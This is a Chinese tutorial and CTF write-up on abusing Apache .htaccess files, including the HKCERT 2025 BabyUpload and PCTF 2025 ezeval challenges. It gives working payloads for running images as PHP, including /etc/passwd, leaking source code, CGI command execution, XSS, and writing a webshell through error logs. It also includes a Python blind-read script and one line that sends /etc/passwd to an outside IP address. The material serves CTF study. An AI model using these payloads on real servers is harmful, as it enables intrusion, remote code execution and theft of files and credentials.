# 		.htaccess

在利用htaccess之前先了解一下htaccess文件

## 什么是`.htaccess`

`.htaccess`被称为"分布式配置文件"，允许在特定目录及其子目录中应用配置命令

| **Related Modules(相关模块)** | **Related Directives(相关指令)** |
| ----------------------------- | -------------------------------- |
| core                          | AccessFileName                   |
| mod_authn_file                | AllowOverride                    |
| mod_authz_groupfile           | Options                          |
| mod_cgi                       | AddHandler                       |
| mod_include                   | SetHandler                       |
| mod_mime                      | AuthType                         |
|                               | AuthName                         |
|                               | AuthUserFile                     |
|                               | AuthGroupFile                    |
|                               | Require                          |

**相关模块**

- **`core`**: Apache 的核心功能。
- **`mod_authn_file` & `mod_authz_groupfile`**: 处理**身份验证**的模块。如果你想用`.htaccess`给文件夹设置密码(比如要求输入用户名/密码)，就需要它们
- **`mod_cgi`**: 用于运行 CGI 脚本
- **`mod_include`**: 用于服务器端包含(SSI)
- **`mod_mime`**: 用于设置文件类型(比如定义 `.html` 是网页)

**相关指令**

A. 控制 `.htaccess` 是否生效的指令(写在主配置文件里)：

- **`AllowOverride`**: **这是最重要的一个。** 它决定了`.htaccess`文件里的哪些指令是被允许执行的。如果这里没开启，`.htaccess`写了也没用。
- **`AccessFileName`**: 用于更改默认的配置文名(比如把`.htaccess`改名为`.config`)

B. 可以在 `.htaccess` 文件内部使用的指令：

- **`AuthType`, `AuthName`, `AuthUserFile`, `Require`**: 这些都是用来做**权限控制**的。比如 `Require valid-user` 表示“只有输入正确密码的用户才能访问”。
- **`Options`**: 控制目录特性(比如是否允许列出文件列表)
- **`AddHandler`, `SetHandler`**: 控制特定文件的处理方式。

## 基本配置

### 容器头

在`.htaccess`中，并不是所有指令都支持全局生效。容器指令用于圈定作用域，使配置仅针对特定的文件、条件或 HTTP 方法生效。

*注意：`.htaccess` 中**不支持** `<Directory>`, `<Location>` 或 `<VirtualHost>` 容器。*

#### 文件控制

用于对特定文件名或符合正则模式的文件应用配置。这是绕过文件上传黑名单或保护敏感文件（如 config.php）的基础。

* **`<Files "filename">`**
  
    * **描述**：精确匹配文件名。
    * **示例**：禁止访问 `config.php`。
    ```apache
    <Files "config.php">
        Require all denied
    </Files>
    ```
    
* **`<FilesMatch "regex">`**
  
    * **描述**：使用正则表达式匹配文件名。比 `<Files>` 更灵活，支持忽略大小写等修饰符。
    * **示例**：统一匹配图片文件。
    ```apache
    # 匹配 .png, .jpg, .gif (不区分大小写)
    <FilesMatch "\.(?i:png|jpg|gif)$">
        Require all granted
    </FilesMatch>
    ```

#### 逻辑判断

* **`<If "expression">`**
  
    * **描述**：Apache 2.4 新增，功能最强。根据请求头、IP、时间、文件状态等动态表达式（AEL）进行判断。
    * **示例**：仅允许 Googlebot 爬虫访问。
    ```apache
    <If "%{HTTP_USER_AGENT} =~ /Googlebot/">
        Require all granted
    </If>
    ```
    
* **`<Else>` / `<ElseIf>`**
    * **描述**：配合 `<If>` 构建完整的逻辑分支。
    * **示例**：
    ```apache
    <If "%{REQUEST_METHOD} == 'POST'">
        # 处理 POST 请求
    </If>
    <Else>
        # 处理其他请求
        Require all denied
    </Else>
    ```

* **`<IfModule module-name>`**
    * **描述**：检测服务器是否安装了某模块。
    * **攻防意义**：**提高 Payload 的容错性**。攻击者常用此指令包裹恶意配置，防止因服务器缺少某个模块（如 `mod_rewrite`）导致直接返回 500 错误从而暴露痕迹。
    ```apache
    <IfModule mod_rewrite.c>
        RewriteEngine On
    </IfModule>
    ```

* **`<IfDefine name>`**
    * **描述**：检测 Apache 启动命令行中是否定义了特定参数（如 `-DMyTest`）。
    * **示例**：
    ```apache
    <IfDefine DebugMode>
        php_flag display_errors on
    </IfDefine>
    ```

#### HTTP方法限制

常用于REST API的权限控制，但配置不当容易导致ACL绕过。

* **`<Limit method-list>`**(黑名单风险)
  
    * **描述**：配置**仅对**列出的 HTTP 方法生效。
    * **风险**：这是一种“白名单”思维写法的黑名单实现。如果你只限制了 `POST`，攻击者可能通过 `HEAD` 或自定义方法绕过限制。
    ```apache
    # 仅限制 POST 请求需要认证，但 GET/HEAD 依然公开！
    <Limit POST>
        Require valid-user
    </Limit>
    ```
    
* **`<LimitExcept method-list>`**
  
    * **描述**：配置对**除了**列出方法之外的所有方法生效。
    * **示例**：只允许 GET 和 POST，拒绝其他所有奇怪的方法（如 PUT, DELETE, TRACE）。
    ```apache
    # 除了 GET 和 POST，其他方法全部拒绝
    <LimitExcept GET POST>
        Require all denied
    </LimitExcept>
    ```

### 容器内部指令

具体内容可以参考:https://www.php.net/manual/zh/ini.list.php

#### 访问控制

| **指令**         | **语法格式**                  | **功能描述**                                                 |
| ---------------- | ----------------------------- | ------------------------------------------------------------ |
| **Require**      | `Require [rule]`              | 定义具体的授权规则（如 `all granted`, `all denied`, `valid-user`）。 |
| **AuthType**     | `AuthType [Type]`             | 指定认证类型（常用 `Basic`）。                               |
| **AuthName**     | `AuthName "String"`           | 弹出登录框时的提示文字。                                     |
| **AuthUserFile** | `AuthUserFile /path`          | 指定密码文件（`.htpasswd`）的绝对路径。                      |
| **Redirect**     | `Redirect [status] /path URL` | 将请求重定向到新的 URL。`status` 可选（如 `permanent` 代表 301 永久跳转），默认为 `temp` (302)。 |

```
<Files "admin.php">
    # 指定认证类型为 Basic
    AuthType Basic
    # 提示文字
    AuthName "Admin Area"
    # 指定密码文件路径
    AuthUserFile /var/www/html/.htpasswd
    # 规则：必须是验证通过的用户
    Require valid-user
</Files>
```

#### 文件处理

| **指令**       | **语法格式**                 | **功能描述**                                                |
| -------------- | ---------------------------- | ----------------------------------------------------------- |
| **SetHandler** | `SetHandler [handler]`       | 强制指定文件的处理器（如 `application/x-httpd-php`）。      |
| **ForceType**  | `ForceType [mime-type]`      | 强制指定文件的 MIME 类型（如 `application/octet-stream`）。 |
| **AddType**    | `AddType [type] [ext]`       | 将扩展名映射到指定的 MIME 类型。                            |
| **AddHandler** | `AddHandler [handler] [ext]` | 将扩展名映射到指定的处理器。                                |

```htaccess
#强制将 .jpg 当作 PHP 解析
<FilesMatch "shell.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>

#强制下载 .pdf 文件 (作为二进制流)
<FilesMatch "\.pdf$">
    ForceType application/octet-stream
</FilesMatch>

#让服务器识别 .apk 文件
AddType application/vnd.android.package-archive .apk

#让 .py 文件作为 CGI 脚本执行
AddHandler cgi-script .py
```

#### HTTP头

| **指令**          | **语法格式**                   | **功能描述**                                                 |
| ----------------- | ------------------------------ | ------------------------------------------------------------ |
| **Header**        | `Header [action] [Name] [Val]` | 设置、追加或删除 HTTP **响应头**（`set`, `append`, `unset`）。 |
| **RequestHeader** | `RequestHeader [action] ...`   | 设置、追加或删除 HTTP **请求头**。                           |

```htaccess
#设置 CORS 跨域响应头
<If "%{HTTP_ORIGIN} =~ /example\.com/">
    Header set Access-Control-Allow-Origin "[http://example.com](http://example.com)"
</If>

#修改请求头，伪造 HTTPS 标志给后端
RequestHeader set X-Forwarded-Proto "https"
```

#### PHP配置

| **指令**      | **语法格式**               | **功能描述**                    |
| ------------- | -------------------------- | ------------------------------- |
| **php_value** | `php_value [name] [value]` | 修改 PHP 配置的值(字符串或数字) |
| **php_flag**  | `php_flag [name] [onoff]`  | 修改php配置的布尔值             |

```htaccess
<Files "upload.php">
    #增加内存限制
    php_value memory_limit 256M
    
    #开启报错显示
    php_flag display_errors on
</Files>
```

#### 环境变量

| **指令**         | **语法格式**                                                 | **功能描述**                        |
| ---------------- | ------------------------------------------------------------ | ----------------------------------- |
| **SetEnv**       | `SetEnv [key] [value]`                                       | 设置环境变量。                      |
| **SetEnvIf**     | `SetEnvIf [Attr] [Regex] [Env]`                              | 根据条件（如 IP、UA）设置环境变量。 |
| **SetEnvIfExpr** | `SetEnvIfExpr *expr [!]env-variable*[=*value*] [[!]*env-variable*[=*value*]] ...` |                                     |

```htaccess
SetEnv APP_ENV dev

SetEnvIf User-Agent "Googlebot" IS_CRAWLER

SetEnvIfExpr "tolower(req('X-Sendfile')) == 'd:\images\very_big.iso')" iso_delivered
SetEnvIfExpr "tolower(req('X-Sendfile')) =~ /(.*\.iso$)/" iso-path=$1
```

------

#### 重写引擎

| 指令 | 语法格式 | 功能描述 |
| :--- | :--- | :--- |
| `RewriteEngine` | `RewriteEngine On|Off` | 开启或关闭重写引擎。 |
| `RewriteBase` | `RewriteBase /path/` | 设置重写基准路径。 |
| `RewriteCond` | `RewriteCond [Test] [Pattern]` | 定义重写生效的前置条件。 |
| `RewriteRule` | `RewriteRule [Pat] [Tgt] [Flag]` | 定义具体的 URL 重写规则。 |

```htaccess
#开启引擎
RewriteEngine On
#设置基准
RewriteBase /

#如果请求的文件不存在 (!-f)
RewriteCond %{REQUEST_FILENAME} !-f

#则转发给 index.php
RewriteRule ^(.*)$ index.php [QSA,L]
```

#### 目录索引

| 指令 | 语法格式 | 功能描述 |
| :--- | :--- | :--- |
| `Options` | `Options [+|-]Indexes` | 允许(`+`)或禁止(`-`)列出目录文件。 |
| `DirectoryIndex` | `DirectoryIndex [file]...` | 设置默认首页文件名（按顺序查找） |
| `IndexIgnore` | `IndexIgnore [pattern]` | 在开启目录浏览时，隐藏匹配的文件。 |

```htaccess
#禁止目录浏览
Options -Indexes

#优先查找 index.php，其次 index.html
DirectoryIndex index.php index.html

#如果开启了目录浏览，隐藏 .git 和 .env 文件
IndexIgnore .git .env
```

#### 错误页面

| **指令**          | **语法格式**                 | **功能描述**                                |
| ----------------- | ---------------------------- | ------------------------------------------- |
| **ErrorDocument** | `ErrorDocument [code] [url]` | 自定义特定错误码（404, 500 等）的显示页面。 |

```htaccess
# 这里的路径是相对于网站根目录的
ErrorDocument 404 /404.html
ErrorDocument 500 "Server Error"
```

### 运算符

#### 正则表达式类

| **运算符** | **描述**   | **语法**              | **示例**                   |
| ---------- | ---------- | --------------------- | -------------------------- |
| **`=~`**   | **匹配**   | `'string' =~ /regex/` | `file('/flag') =~ /flag{/` |
| **`!~`**   | **不匹配** | `'string' !~ /regex/` | `file('/flag') !~ /Error/` |

#### 字符串比较类

*注：按字典序 (Lexicographical order) 进行比较*

| **运算符**         | **描述**     | **语法**           | **示例**                        |
| ------------------ | ------------ | ------------------ | ------------------------------- |
| **`==`** / **`=`** | **相等**     | `'str1' == 'str2'` | `file('/flag') == 'flag{test}'` |
| **`!=`**           | **不相等**   | `'str1' != 'str2'` | `req('Host') != 'localhost'`    |
| **`<`**            | **小于**     | `'str1' < 'str2'`  | `file('/flag') < 'flag{M'`      |
| **`<=`**           | **小于等于** | `'str1' <= 'str2'` | `file('/flag') <= 'flag{M'`     |
| **`>`**            | **大于**     | `'str1' > 'str2'`  | `file('/flag') > 'flag{N'`      |
| **`>=`**           | **大于等于** | `'str1' >= 'str2'` | `file('/flag') >= 'flag{N'`     |

#### 集合操作

| **运算符** | **描述**     | **语法**                | **示例**                                    |
| ---------- | ------------ | ----------------------- | ------------------------------------------- |
| **`in`**   | **在集合内** | `'str' in { 'a', 'b' }` | `file('/flag') in { 'flag_v1', 'flag_v2' }` |

#### 逻辑运算符

| 运算符 | 描述 | 语法 | 示例 |
| :--- | :--- | :--- | :--- |
| `&&` | **与** (AND) | `cond1 && cond2` | `file('/flag') =~ /a/ && req('User-Agent') == 'Admin'` |
| `||` | **或** (OR) | `cond1 || cond2` | `file('/flag') =~ /a/ \|\| file('/flag') =~ /b/` |
| `!` | **非** (NOT) | `!cond` | `!(file('/flag') =~ /sql/)` |

#### 一元运算符

| **运算符** | **描述**            | **语法**      | **示例**                          |
| ---------- | ------------------- | ------------- | --------------------------------- |
| **`-n`**   | **非空 (Not Null)** | `-n 'string'` | `-n file('/flag')`                |
| **`-z`**   | **为空 (Zero)**     | `-z 'string'` | `-z req('Referer')`               |
| **`-T`**   | **表达式为真**      | `-T expr`     | `-T (file('/flag') =~ /a/)`       |
| **`-F`**   | **表达式为假**      | `-F expr`     | `-F (req('Host') == 'localhost')` |

### 表达式函数

| **分类**        | **函数名**                | **描述**                             | **示例**                                   |
| --------------- | ------------------------- | ------------------------------------ | ------------------------------------------ |
| **字符串处理**  | `tolower(str)`            | 转小写 (常用)                        | `tolower(%{HTTP_USER_AGENT}) =~ /android/` |
|                 | `toupper(str)`            | 转大写                               | `toupper(%{REQUEST_URI}) =~ /ADMIN/`       |
|                 | `escape(str)`             | URL 编码 (%hex)                      | `escape("a b")` (结果: `a%20b`)            |
|                 | `unescape(str)`           | URL 解码                             | `unescape(%{QUERY_STRING})`                |
|                 | `replace(str, from, to)`  | 字符串替换                           | `replace(%{REQUEST_URI}, "old", "new")`    |
| **HTTP 头信息** | `req(header_name)`        | 获取请求头 (Request Header)          | `req('Host')` 等同于 `%{HTTP_HOST}`        |
|                 | `resp(header_name)`       | 获取响应头 (Response Header)         | `resp('Content-Type')`                     |
|                 | `req_novary(header_name)` | 获取请求头但不影响 Vary (高级优化用) | (通常直接用 `req`)                         |
| **环境变量**    | `env(name)`               | 读取环境变量 (最常用)                | `env('PATH_INFO')`                         |
|                 | `osenv(name)`             | 读取操作系统环境变量                 | `osenv('PATH')`                            |
|                 | `reqenv(name)`            | 读取请求级环境变量                   | `reqenv('SCRIPT_FILENAME')`                |
|                 | `note(name)`              | 读取 mod_rewrite 设置的 note         | `note('my_rewrite_flag')`                  |
| **编码与哈希**  | `base64(str)`             | Base64 编码                          | `base64('admin')`                          |
|                 | `unbase64(str)`           | Base64 解码                          | `unbase64(%{HTTP_AUTHORIZATION})`          |
|                 | `md5(str)`                | 计算 MD5 哈希                        | `md5('123456')`                            |
|                 | `sha1(str)`               | 计算 SHA1 哈希                       | `sha1('password')`                         |
| **文件系统**    | `file(path)`              | 读取文件内容                         | `file('/etc/passwd')`                      |
|                 | `filesize(path)`          | 获取文件大小 (字节)                  | `filesize('/var/www/backup.zip')`          |
|                 | `filemod(path)`           | 获取文件最后修改时间                 | `filemod('/var/www/index.php')`            |
| **安全防护**    | `ldap(str)`               | 对字符进行 LDAP 转义 (防注入)        | `ldap(%{QUERY_STRING})`                    |
|                 | `escapehtml(str)`         | 对 HTML 特殊字符进行转义 (防 XSS)    | `escapehtml(%{QUERY_STRING})`              |

## 利用方式

测下来发现htaccess越试越有

配置一个php环境，简单限制几个函数以及设置`open_basedir`

```php
<?php
highlight_file(__FILE__);

if (isset($_REQUEST['Pr0x1ma'])) {
    eval($_REQUEST['Pr0x1ma']);
}

?>
```

![image-20251225163648259](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225163648461.png)

![image-20251225163714501](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225163714633.png)

![image-20251225163728874](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225163729036.png)

### 文件解析

**原理**：
Apache通过处理器和MIME类型来决定如何处理文件。可以通过`.htaccess`修改这些映射关系，强制服务器将非php后缀（如`.png`、`.jpg`...）的文件当作 PHP 脚本执行

**利用方式**：

* **SetHandler**：强制指定文件处理器。
  
    ```apache
    # 将images.png强制当做PHP执行
    <FilesMatch "images.png">
        SetHandler application/x-httpd-php
    </FilesMatch>
    ```
    
* **AddType**：将特定后缀映射为 PHP 类型。
  
    ```apache
    # 将.png后缀映射为PHP文件解析
    AddType application/x-httpd-php .png
    ```

先写一个png文件
![image-20251225163826774](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225163827090.png)

然后传入`.htaccess`文件，内容为`AddType application/x-httpd-php .png`，再次访问a.png，可以看到被解析为php了

![image-20251225163523672](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225163524005.png)

![image-20251225163617468](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225163617619.png)

### 文件包含

**原理**：
利用php的`auto_prepend_file`或`auto_append_file`配置项，在访问任意php文件之前或之后自动包含指定文件

![image-20251225172019851](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225172019950.png)

**利用方式**：

* **本地文件包含**：
  
    ```apache
    # 访问PHP文件前，自动包含 /etc/passwd
    php_value auto_prepend_file /etc/passwd
    ```

这里有open_basedir被限制了，不过可以看到是可以包含的

![image-20251225164004090](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225164004398.png)

包含index.php可以看到能够成功
![image-20251225164135016](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225164135350.png)

![image-20251225164159080](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225164159190.png)

* **伪协议包含**：直接执行代码(需开启 `url_include`)。

    ```apache
    php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
    ```

    忘记设置了，不演示了

* **自包含**：让 `.htaccess` 包含自己，把要执行的代码注释掉避免崩掉

    ```apache
    php_value auto_append_file .htaccess
    #<?php phpinfo();?>
    ```

![image-20251225164417595](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225164417960.png)

![image-20251225164439185](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225164439353.png)

### 源码泄露

**原理**：
通过将设置为false，使服务器不解析php代码从而导致源码泄露

![image-20251225171941938](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225171942049.png)

**利用方式**：

```htaccess
php_flag engine 0
```

先传一个leak.php

![image-20251225164705401](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225164705696.png)

直接访问只会显示php代码执行后的结果，看不到源码

![image-20251225164725259](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225164725390.png)

利用`.htaccess`把engine设置为0，让leak.php没法被服务器解析

![image-20251225164833975](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225164834277.png)

这时候再去访问leak.php，php代码不会被解析而是直接显示

![image-20251225164847288](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225164847440.png)

### 绕过正则检测

**原理**：

设置php的正则回溯次数限制为0，从而绕过preg_match

![image-20251225171909095](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225171909238.png)

**利用方式**：

```htaccess
php_value pcre.backtrack_limit 0
php_value pcre.jit 0
```

稍微改下题目

```php
<?php
highlight_file(__FILE__);

if (isset($_REQUEST['Pr0x1ma'])) {
    eval($_REQUEST['Pr0x1ma']);
}

$preg = $_POST['preg'];

if (!preg_match("/[a-z0-9]/i", $preg) && ($preg == "Pr0x1ma")){
    echo "success";
}else{
    echo "未通过preg_match";
}

?>
```

这里只有当preg等于目标值以及preg中不含字母数字的时候才会回显success，看起来好像没法做到，但是通过htaccess将正则回溯次数设置为0就能够绕过

先上传htaccess将回溯次数限制为0

![image-20251225171644262](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225171644634.png)

修改后直接传入就能够通过正则匹配

![image-20251225171752896](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225171753062.png)

### 命令执行

**原理**：

如果php代码防的太死了没法rce，可以利用Apache的CGI模块执行系统命令，这个命令是调用操作系统执行的，不受php解释器内部设置的限制，因此能够用来绕过open_basedir。需要服务器开启mod_cgi或mod_fcgid

![image-20251225172406864](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225172406986.png)

**利用方式**：

- **CGI 启动**：将特定后缀定义为脚本执行。

  ```htaccess
  # 允许当前目录执行CGI脚本(必须开启，否则 403 Forbidden)
  Options +ExecCGI
  
  #建立映射,后缀为.xx的文件都调用cgi-script来处理
  AddHandler cgi-script .xx
  ```

  配合上传的exp.xx脚本达成rce，但是需要脚本具有执行的权限

  ```
  chmod('{filename}', 0777)
  ```
  
  
  
  ```bash
  #!/bin/bash
  #必须先输出 Content-type，然后输出一个空行（\n\n）
  echo "Content-type: text/plain"
  echo ""
  
  #然后是要执行的命令
  whoami
  ls -la
  ```

  访问exp.xx时，apache会调用系统的`/bin/sh`运行这个脚本，并直接回显结果
  
  现在的环境中是开启了open_basedir的，将目录限制在了`/var/www/html`中
  
  ![image-20251225163728874](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225163729036.png)
  
  用cgi脚本的方法来绕过，先上传htaccess
  
  ![image-20251225173206933](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225173207195.png)
  
  然后上传恶意cgi脚本并赋予执行权限进行rce，成功绕过open_basedir并读取到flag
  
  ![image-20251225174102188](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225174102631.png)
  
  **FastCGI 启动(一般是windows)**：指定解释器处理(比如cmd.exe)特定文件，这里不做演示了
  
  ```htaccess
  Options +ExecCGI
  AddHandler fcgid-script .xx
  
  #指定解释器 wrapper
  #是请求.xx文件，无论文件里写的什么，直接运行后面的命令
  FcgidWrapper "C:/Windows/System32/cmd.exe /k start calc.exe" .xx
  ```

### XSS攻击

原理：

修改PHP的调试或报错配置，利用插入highlight中达成xss

![image-20251225191822565](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225191822686.png)

**利用方式**：

- **利用高亮注释**：

  如果有字符串可以通过`highlight.string`在页面中设置`<font color="payload">`的形式触发xss
  
  ```htaccess
  php_value highlight.string '"><script>alert(1);</script>'
  ```
  
  ![image-20251225192136379](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225192136514.png)
  
- **利用报错信息**：

  ![image-20251225192902544](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225192902657.png)
  
  ![image-20260103203845197](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20260103203852618.png)
  
  ![image-20260103203904349](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20260103203904463.png)
  
  在报错的时候php会将报错的函数名变成一个超链接，链接到php手册中相应的内容，比如`<a href="http://php.net/manual/en/function.include">function.include</a>`，通过docref_root能够修改标签中的值从而导致xss
  
  payload:`'><script>alert(1);</script>`
  
  报错生成:
  
  ```html
  <a href=''><script>alert(1);</script>function.include'>function.include</a>
  ```
  
  这里的报错不能是fatal error，并且必须由内置函数引起才能触发
  
  ```htaccess
  php_flag display_errors 1
  php_flag html_errors 1
  php_value docref_root "'><script>alert(1);</script>"
  ```
  
  ![image-20251225193255650](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225193255794.png)
  
  ![image-20251225193329731](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225193329946.png)

### 利用错误日志写马

原理：

利用error_log将错误信息写入制定的文件中

![image-20251225194025507](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225194025719.png)

![image-20251225195318476](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225195318596.png)

为了确保所有的错误都能被报告，要把error_reporting设置为E_ALL

![image-20251225195617941](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225195618083.png)

传入一个

![image-20251226141756609](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251226141756971.png)

能看到错误信息中含有写入的payload

![image-20251225195725789](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225195725923.png)

但是并没有被解析，源代码中的尖括号被转义了，没法执行

![image-20251225195814797](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225195814903.png)

该怎么让输出的信息不被转义呢，注意到有一个html_errors，将这个禁用之后错误消息中就不会有html的印记而是纯文本的格式，因此就不会被转义

![image-20251225200223162](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225200223274.png)

于是可以构造

```htaccess
php_flag html_errors off
php_flag log_errors on
php_value error_log "/var/www/html/pr0.php"
php_value error_reporting 30719
php_value include_path "<?php phpinfo(); ?>"
```

成功执行

![image-20251225200529815](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225200529958.png)

### 读文件

**盲注**

原理：

利用apache表达式中的`<If>`容器头和函数判断，结合自定义错误页面或者重定向进行盲注

根据:https://httpd.apache.org/docs/2.4/expr.html

可以知道apache的表达式解析器中有一个file函数，能够用来读取文件，同时还提供了运算符可以进行字符的运算

![image-20251225204110327](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225204110484.png)



![image-20251225204057918](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225204058059.png)

在`<IF>`文件头中利用file和`=~`或者比较符对字符进行猜测，如何猜测字符的方法有了，该怎么判断是否盲注成功呢?

在htaccess容器的内部指令中有一个`ErrorDocument`可以让我们自定义错误页面:https://httpd.apache.org/docs/current/zh-cn/mod/core.html#errordocument

示例

```htaccess
ErrorDocument 500 http://example.com/cgi-bin/server-error.cgi
ErrorDocument 404 /errors/bad_urls.php
ErrorDocument 401 /subscription_info.html
ErrorDocument 403 "Sorry, can't allow you access today"
ErrorDocument 403 Forbidden!
ErrorDocument 403 /errors/forbidden.py?referrer=%{escape:%{HTTP_REFERER}}
```

还有一个`Redirect`能自定义重定向页面

示例

```htaccess
# Redirect to a URL on a different host
Redirect "/service" "http://foo2.example.com/service"

# Redirect to a URL on the same host
Redirect "/one" "/two"
```

于是我们可以在成功的时候自定义一个错误页面或者将一个页面重定向，以此来判断盲注是否成功

可以得到

```htaccess
<If "file('/flag') < 'flag{'">
	ErrorDocument 404 "success"
</If>
```

示例:

最近hkcert就有一个htaccess的

**[hkcert2025]BabyUpload**

源码

```php
<?php
// Simulation of the class structure provided
class Uploader {
    public function requireAdmin(): void {
        // In a real scenario, this checks logic.
        // For this CTF, we assume you are authorized to see this page.
        return;
    }

    public function handleUpload(): void {
        $this->requireAdmin();

        if (!isset($_FILES['file'])) {
            return;
        }

        $file = $_FILES['file'];

        // The core logic
        // 1. Filename cannot contain 'p' (case insensitive)
        // 2. Content cannot contain 'php', '\', or '?'
        if (!preg_match("/p/i", $file['name']) &&
            !preg_match("/php|\\\\|\?/i", file_get_contents($file['tmp_name']))) {

            $target_dir = 'test/';
            if (!is_dir($target_dir)) {
                mkdir($target_dir, 0777, true);
            }

            $target_file = $target_dir . basename($file['name']);

            if (move_uploaded_file($file['tmp_name'], $target_file)) {
                echo '<div class="alert alert-success">File uploaded successfully: <a href="'.$target_file.'">'.$target_file.'</a></div>';
            } else {
                echo '<div class="alert alert-danger">Upload failed (Permission error?)</div>';
            }
        } else {
            echo '<div class="alert alert-danger">Invalid file! I smell a "P" or something malicious...</div>';
        }
    }
}

// Handle logic
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $uploader = new Uploader();
    $uploader->handleUpload();
}
?>
```

把字母p还有`?`和`\`ban掉了，然后就是一个文件上传，直接介绍怎么用htaccess构造

**最简单的方法**

直接用错误页面包含flag

```htaccess
ErrorDocument 404 "%{file:/flag}"
```

![image-20251226092204274](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251226092211428.png)

**盲注**

用盲注的方法也可以，payload中也没有p

```python
import requests
import sys

url = "http://web-5d0f4b4726.challenge.xctf.org.cn"

flag = "flag{"

def check(curr_flag):

    hta_data = f"""<If "file('/flag') < '{curr_flag}'">
ErrorDocument 404 "success"
</If>"""

    files = {"file" : (".htaccess", hta_data, 'application/octet-stream')}

    try:
        requests.post(url, files=files)
        res = requests.get(f"{url}/test/Pr0")
        if "success" in res.text:
            return True
        else:
            return False
    except:
        return False

while True:
    high = 126
    low = 32

    while low <= high:
        mid = (low + high) // 2
        char = chr(mid)

        tmp = flag + char

        if check(tmp):
            high = mid - 1
        else:
            low = mid + 1

    found_char = chr(high)
    flag += found_char
    print(flag)

    if found_char == "}":
        break
```

![image-20251226093338451](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251226093338866.png)

利用`SetEnvIfExpr`可以将file()读取到的内容放到环境变量中，然后通过读取环境变量来拿到读取的文件内容，并且在file中是支持编码的，可以用base64的格式来绕过

表达式中的`$1`是正则匹配到的第一个值，将`$1`赋给环境变量中的Index从而将读取内容带到环境变量中

在file内可以用unbase64或者直接用十六进制进行编码绕过，因为在

```htaccess
SetEnvIfExpr "file(unbase64('aW5kZXgucGhw')) =~ /(.*)/" Index=$1
SetEnvIfExpr "file('\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64') =~ /(.*)/" Index=$1
ErrorDocument 404 "%{ENV:Index}"
```

或者写到响应头里面

```htaccess
SetEnvIfExpr "file('/flag') =~ /(.*)/" Index=$1
Header set X-Get-Flag "%{ENV:Index}"
#cookie也可以
Header set Set-Cookie "flag=%{ENV:Index}; path=/"
#利用header写到响应头中的时候mod_headers要开启，不过默认是关闭的

#用认证模块写到响应头，这个默认就能用
SetEnvIfExpr "escape(file('/etc/passwd')) =~ /(.*)/" Index=$1
AuthType Basic
AuthName "%{ENV:Index}"
Require valid-user
```

或者利用重定向

```htaccess
RewriteEngine On
SetEnvIfExpr "escape(file('/flag')) =~ /(.*)/" Index=$1
RewriteRule .* /%{ENV:Index} [R=302,L]
#这个要开mod_rewrite
```

没法读到回显的时候可以外带，不过都能设置404了肯定有回显，如果有换行需要加一个escape或者base64编码一下不然会爆500

```htaccess
SetEnvIfExpr "escape(file('/etc/passwd')) =~ /(.*)/" Index=$1
ErrorDocument 404 "http://124.221.168.69:2333/?data=%{ENV:Index}"
```

![image-20251226093629961](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251226093630191.png)

**[PCTF2025]ezeval**

题目内容

```
"告诉你吧，flag在/love1145141919810 flag格式:PCTF{[0-9a-z]{8}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{12}} 本题来源于XCTF 9th Final (注：此题为挑战题，贴近真实比赛与真实生产场景，并非新生赛难度，请各位量力而行。) "
```

环境是php8.4，open_basedir限制在/var/www/html中，网上能搜到的绕过open_basedir的方法都被ban掉了，还设置了一堆disable_function

![image-20251225202119132](http://gcore.jsdelivr.net/gh/pr0x1maa/images@main/typora20251225202119398.png)

**盲注**

htaccess配置文件中的file不受php的open_basedir影响，可以写一个脚本盲注

